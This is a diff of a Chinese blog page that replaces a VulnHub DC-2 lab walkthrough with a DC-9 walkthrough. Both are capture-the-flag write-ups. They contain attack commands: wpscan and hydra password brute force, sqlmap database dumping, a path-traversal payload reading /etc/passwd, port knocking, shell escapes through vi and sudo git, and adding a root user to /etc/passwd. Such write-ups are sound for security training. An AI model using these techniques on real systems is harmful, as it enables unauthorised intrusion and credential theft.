@@ -79,27 +79,15 @@
 
 
 
-<meta name="description" content="DC-2Author:Xingg靶机下载:vulnhub-DC2wpscan搜集信息进入后台，sudo git权限 more less提权root">
+<meta name="description" content="DC-9Author:Xinggsql注入拿到大量账号密码，加上文件包含获取&#x2F;etc&#x2F;knockd.conf，爆破ssh,连上用户发现备份密码，切换用户，发现有写权限的程序，用户写入&#x2F;etc&#x2F;passwd，拿到root">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-2">
-<meta property="og:url" content="http://yoursite.com/2020/03/17/DC-2/index.html">
+<meta property="og:title" content="DC-9">
+<meta property="og:url" content="http://yoursite.com/2020/03/17/DC-9/index.html">
 <meta property="og:site_name" content="Xingg&#39;s Blog">
-<meta property="og:description" content="DC-2Author:Xingg靶机下载:vulnhub-DC2wpscan搜集信息进入后台，sudo git权限 more less提权root">
+<meta property="og:description" content="DC-9Author:Xinggsql注入拿到大量账号密码，加上文件包含获取&#x2F;etc&#x2F;knockd.conf，爆破ssh,连上用户发现备份密码，切换用户，发现有写权限的程序，用户写入&#x2F;etc&#x2F;passwd，拿到root">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101212927985.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213208553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213240355.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213255692.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213717951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101213854782.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214000603.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214244547.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214346894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214510897.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200101214612543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-16T16:27:19.000Z">
-<meta property="article:modified_time" content="2020-03-17T14:07:23.752Z">
+<meta property="article:modified_time" content="2020-03-17T14:26:52.988Z">
 <meta property="article:author" content="Xingg">
 <meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="HTB">
@@ -107,7 +95,6 @@
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
 
 
 
@@ -137,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/17/DC-2/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/17/DC-9/"/>
 
 
 
 
 
-  <title>DC-2 | Xingg's Blog</title>
+  <title>DC-9 | Xingg's Blog</title>
   
 
 
@@ -260,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/DC-2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/DC-9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Xingg">
@@ -277,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DC-2</h1>
+          <h1 class="post-title" itemprop="name headline">DC-9</h1>
         
 
         <div class="post-meta">
@@ -349,63 +336,46 @@
       
 
       
-        <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p><strong>Author:Xingg</strong><br>靶机下载:<a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">vulnhub-DC2</a><br>wpscan搜集信息进入后台，sudo git权限 more less提权root</p>
+        <h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p><strong>Author:Xingg</strong><br>sql注入拿到大量账号密码，加上文件包含获取/etc/knockd.conf，爆破ssh,连上用户发现备份密码，切换用户，发现有写权限的程序，用户写入/etc/passwd，拿到root</p>
 <a id="more"></a>
 
-<p>nmap扫描<br><img src="https://img-blog.csdnimg.cn/20200101213638648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>直接进入80端口 作者给出的提示 让我们使用cewl  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101212927985.png" alt="在这里插入图片描述"></p>
-<p>然后网站上有很多乱码的字母 应该是密码了<br>cewl是一个密码攻击工具，能够爬取网页上的所有单词生成一个列表  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w dc2.txt</span><br></pre></td></tr></table></figure>
+<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-9,412/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-9,412/</a><br>首先nmap扫描一下  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.49.26 -sT -sV -p- -T5 -A</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020010922002730.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line"></span><br><span class="line">直接进入80端口，发现一个search框，可以查询用户信息，与数据库有交互  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200109220224863.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">直接跑sqlmap，果然发现了漏洞  </span><br><span class="line">脱裤吧  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200109220239617.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">这里发现了网站后台的admin以及密码 在线MD5解一下  </span><br><span class="line">admin: transorbital1  </span><br><span class="line">还有个用户表（这里感受到了美国人民对川普的爱戴）  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200109220255602.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70)  </span><br><span class="line">以及这里这么多用户的账号密码 可能有用 全部拖下来  </span><br><span class="line"></span><br><span class="line">在网站用admin: transorbital1进入后台后多了两个页面，在其中一个页面的下面发现了File does not exits 猜测存在文件包含  </span><br><span class="line">尝试一下  </span><br><span class="line">http:&#x2F;&#x2F;192.168.49.26&#x2F;addrecord.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020010922062366.png?x-oss-process&#x3D;image&#x2F;watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA&#x3D;&#x3D;,size_16,color_FFFFFF,t_70) </span><br><span class="line">果然是文件包含，而且这里那么多用户，都是我我们前面拖过库的用户，用hydra跑一下  </span><br><span class="line">但是nmap也没扫到22端口，直接连接22端口发现被拒绝了  </span><br><span class="line">可能是写了安全策略  </span><br><span class="line">查看一下&#x2F;etc&#x2F;knockd.conf  </span><br><span class="line">http:&#x2F;&#x2F;192.168.49.26&#x2F;addrecord.php？file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;knockd.conf  </span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20200109220814471.png)  </span><br><span class="line">我们也要启动knockd</span><br></pre></td></tr></table></figure>
+<p>knockd –v 7469 8475 9842 </p>
+<pre><code>此时22端口已经可以连上了  
 
-<p>网站是WordPress搭建的<br>wpscan扫描第一波没有可以用漏洞 那就枚举用户  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200101213208553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现了三个用户 admin  jerry  tom<br>然后用刚才cewl生成的字典爆破用户 得到了jerry和tom的密码  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213240355.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213255692.png" alt="在这里插入图片描述"></p>
-<table>
-<thead>
-<tr>
-<th>Username</th>
-<th>Password</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tom</td>
-<td>parturient</td>
-</tr>
-<tr>
-<td>jerry</td>
-<td>adipiscing</td>
-</tr>
-</tbody></table>
-<p>用jerry的账号进了wordpress后台 发现了作者给的提示  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213717951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>another way想到刚才nmap还跑出来一个ssh端口 尝试连接 用tom的账号进了  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101213854782.png" alt="在这里插入图片描述"></p>
-<p>但是却被限制使用cat命令  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214000603.png" alt="在这里插入图片描述"></p>
-<p>尝试vi提权  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi </span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shel</span><br></pre></td></tr></table></figure>
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109220854773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)  
+用刚才sqlmap跑出来的账号密码，hydra爆破  
+hydra –L username.txt –P password.txt –t 5 192.168.49.26 ssh  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109220916623.png)  
+跑出来三个  
+chandlerb:UrAGOD!  
+janitor:Ilovepeepee  
+joeyt:Passw0rd  
+三个都连上之后，在janitor的/home目录下发现一个隐藏目录，其中包含了一些密码  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109220939125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)  
 
-<p>但是发现还是不能使用cat命令<br>我们再设置PATH变量  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
+我把他们加入了刚才的password.txt，再用hydra跑一遍  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221013937.png)  
+多发现一个fredf  
+连上后sudo -l  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221021566.png)  
+我也不太明白这是个啥 测试了一下 是用来往文件添加文件的  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221113462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)  
+那就直接写一个root进/etc/passwd  
+先用openssl生成一个密码 123 加盐用户名root3  
+ ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221156338.png)  
+然后按/etc/passwd的格式写一个文件  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221211115.png)  
+然后用sudo test写进/etc/passwd  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109221231924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70)  
+欢迎师傅们指点
 
-<p>然后就能使用cat命令了  </p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214244547.png" alt="在这里插入图片描述"></p>
-<p>提示说su for jerry<br>那就执行命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200101214346894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>作者提示我们git<br>果然查看sudo -l 可以执行git</p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214510897.png" alt="在这里插入图片描述">  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span> config </span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
 
-<p>此处用到的是less more的shell提权</p>
-<p><img src="https://img-blog.csdnimg.cn/20200101214612543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p>
-<p>欢迎师傅们指点</p>
-<p>邮箱：<a href="mailto:xingg051@163.com">xingg051@163.com</a></p>
 
+
+
+</code></pre>
       
     </div>
     
@@ -429,8 +399,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/17/DC-9/" rel="next" title="DC-9">
-                <i class="fa fa-chevron-left"></i> DC-9
+              <a href="/2020/03/17/prime-1/" rel="next" title="prime-1">
+                <i class="fa fa-chevron-left"></i> prime-1
               </a>
             
           </div>
@@ -439,8 +409,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/03/17/DC-3/" rel="prev" title="DC-3">
-                DC-3 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/03/17/DC-2/" rel="prev" title="DC-2">
+                DC-2 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -564,7 +534,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-2"><span class="nav-number">1.</span> <span class="nav-text">DC-2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-9"><span class="nav-number">1.</span> <span class="nav-text">DC-9</span></a></li></ol></div>
             
 
           </div>
